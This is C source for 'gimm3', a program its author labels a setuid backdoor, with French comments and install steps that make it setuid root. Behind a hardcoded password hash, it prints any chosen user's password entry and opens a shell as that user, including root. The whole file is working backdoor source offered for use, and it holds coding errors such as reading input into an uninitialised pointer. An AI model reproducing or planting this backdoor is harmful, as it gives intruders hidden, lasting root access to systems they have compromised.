/************************************************
 * gimm3 : suid backdoor by sirius_black        *
 * http://membres.lycos.fr/lotfree              *
 * gcc -o gimm3 gimm3.c -lcrypt                 *
 * chown root.root gimm3                        *
 * chmod 4755 gimm3                             *
 * password par défaut : r00tm3                 *
 * args : a login or a uid                      *
 ***********************************************/

#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <unistd.h>

#define SHELL "/bin/sh"
#define password "sbgHECtgJ2EQI"
/*attention le pass est crypté en des*/

void usage(char *prog)
{
	printf("Usage: %s [Login | Uid]\n",prog);
	exit(0);
}

int main(int argc,char *argv[])
{
	char **reste;
	long l;
	struct passwd *info;
	char *pass;
	if(argc!=2)usage(argv[0]);
	system("stty -echo > /dev/tty");
	printf("Password: ");
	scanf("%s",pass);
	system("stty echo > /dev/tty");
	if((strcmp(((char*)crypt(pass,"sb")),password))!=0){printf("\nBad password\n");exit(0);}
	l=strtol(argv[1],reste,10);
	if(strlen(*reste)==0)//on a un uid
	{
		if((info=getpwuid((uid_t)l))==NULL)
		{
			printf("\nUID invalide\n");
			exit(0);
		}
	}
	else{//on a un login
		if((info=getpwnam(argv[1]))==NULL)
		{
			printf("\nLogin invalide\n");
			exit(0);
		}
	}
	printf("\n---------------\n");
	printf("username:%s\npassword:%s\niud:%d\ngid:%d\nname:%s\nhome:%s\nshell:%s\n",
			info->pw_name,
			info->pw_passwd,
			info->pw_uid,
			info->pw_gid,
			info->pw_gecos,
			info->pw_dir,
			info->pw_shell);
	printf("---------------\n");
	if(setuid(info->pw_uid)==-1)
	{
		printf("Problème lors du setuid\n");
		exit(0);
	}
	setgid(info->pw_uid);
	system(SHELL);
	return 0;
}
